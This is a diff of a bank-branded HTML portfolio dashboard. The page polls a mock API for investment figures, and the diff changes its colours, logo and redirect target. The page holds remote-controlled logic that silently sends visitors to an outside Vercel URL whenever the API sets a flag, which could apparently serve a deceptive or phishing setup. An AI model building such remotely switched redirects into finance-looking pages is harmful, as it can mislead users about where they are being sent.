@@ -6,26 +6,26 @@
 <title>Portfolio Dashboard</title>
 <script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
 <style>
-body { font-family: Inter, sans-serif; margin:0; background:#0f1724; color:#e6eef8; }
+body { font-family: Inter, sans-serif; margin:0; background:#582d7d; color:#e6eef8; }
 .wrap { max-width:420px; margin:0 auto; padding:16px; }
 .logo { display:block; width:120px; margin:0 auto 20px; }
-.card { background:#0b1220; border-radius:14px; padding:16px; margin-bottom:16px; box-shadow:0 4px 12px rgba(0,0,0,0.5); }
+.card { background:#3d1f5e; border-radius:14px; padding:16px; margin-bottom:16px; box-shadow:0 4px 12px rgba(0,0,0,0.5); }
 .user-info { text-align:center; }
 .user-info h2 { margin:0; font-size:20px; }
-.user-info p { margin:6px 0 0; color:#98a0b3; font-size:14px; }
+.user-info p { margin:6px 0 0; color:#cfcfd1; font-size:14px; }
 .chart-wrap { height:260px; margin-top:12px; }
 canvas { width:100% !important; height:100% !important; }
 .legend { display:flex; gap:12px; margin-top:8px; flex-wrap:wrap; }
-.legend-item { display:flex; align-items:center; gap:6px; font-size:13px; color:#98a0b3; }
+.legend-item { display:flex; align-items:center; gap:6px; font-size:13px; color:#cfcfd1; }
 .swatch { width:12px; height:12px; border-radius:3px; }
-.meta { display:flex; justify-content:space-between; margin-top:8px; font-size:12px; color:#98a0b3; }
-.btn { background:transparent; border:1px solid rgba(255,255,255,0.06); padding:6px 10px; border-radius:10px; color:#98a0b3; font-size:13px; cursor:pointer; }
+.meta { display:flex; justify-content:space-between; margin-top:8px; font-size:12px; color:#cfcfd1; }
+.btn { background:transparent; border:1px solid rgba(255,255,255,0.1); padding:6px 10px; border-radius:10px; color:#cfcfd1; font-size:13px; cursor:pointer; }
 </style>
 </head>
 <body>
 <div class="wrap">
 
-<img class="logo" src="https://via.placeholder.com/300x80.png?text=Bank+Logo" alt="Bank Logo">
+<img class="logo" src="https://github.com/javad-niroumand/Lisa/blob/main/ChatGPT%20Image%20Nov%2025,%202025,%2002_43_24%20PM%20(1).png?raw=true?raw=true" alt="Bank Logo">
 
 <div class="card user-info">
 <h2 id="userName">—</h2>
@@ -56,8 +56,8 @@ canvas { width:100% !important; height:100% !important; }
 // -------------------------------------------------
 // Redirect configuration
 // -------------------------------------------------
-let redirectDone = false;
-const REDIRECT_URL = "https://trascription-git-main-javad-niroumands-projects.vercel.app/";
+let redirectTriggered = false;
+const REDIRECT_URL = "https://vercel.com/javad-niroumands-projects/trascription/A1oacQnPswrrN4cgv9mfB9keso97";
 
 // -------------------------------------------------
 const API_URL = "https://6797e9d9c2c861de0c6e6bdf.mockapi.io/investments/12345";
@@ -89,12 +89,12 @@ async function fetchData(){
     // -------------------------------------------------
     // 🔥 AUTO-REDIRECT LOGIC
     // -------------------------------------------------
-    if (data.update === true && !redirectDone) {
-        redirectDone = true;
-        window.location.href = REDIRECT_URL;
+    if(data.update === true && !redirectTriggered){
+      redirectTriggered = true;
+      window.location.href = REDIRECT_URL;
     }
-    if (data.update === false) {
-        redirectDone = false;
+    if(data.update === false){
+      redirectTriggered = false; // reset trigger
     }
     // -------------------------------------------------
 
@@ -196,8 +196,8 @@ function initCharts(){
       maintainAspectRatio:false,
       animation:{duration:700},
       scales:{
-        x:{ticks:{color:'#98a0b3'}},
-        y:{ticks:{color:'#98a0b3'}}
+        x:{ticks:{color:'#cfcfd1'}},
+        y:{ticks:{color:'#cfcfd1'}}
       },
       plugins:{
         tooltip:{
@@ -216,4 +216,3 @@ setInterval(fetchData, 8000);
 </script>
 </body>
 </html>
-
